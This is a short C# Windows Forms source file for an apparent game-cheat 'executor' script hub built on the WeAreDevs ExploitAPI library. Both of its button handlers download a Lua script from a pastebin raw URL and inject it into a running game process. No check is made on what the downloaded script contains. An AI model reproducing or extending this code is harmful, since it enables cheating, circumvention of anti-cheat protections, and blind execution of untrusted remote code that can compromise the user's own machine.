using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;
namespace executor
{
    [DebuggerDisplay("{" + nameof(GetDebuggerDisplay) + "(),nq}")]
    public partial class ScriptHub : Form
    {
        ExploitAPI module = new ExploitAPI();
        public ScriptHub()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/M6uvCBjR");
            module.SendLuaScript(Script);
        }

        private string GetDebuggerDisplay()
        {
            return ToString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/d4kCtdZn");
            module.SendLuaScript(Script);
        }
    }
}
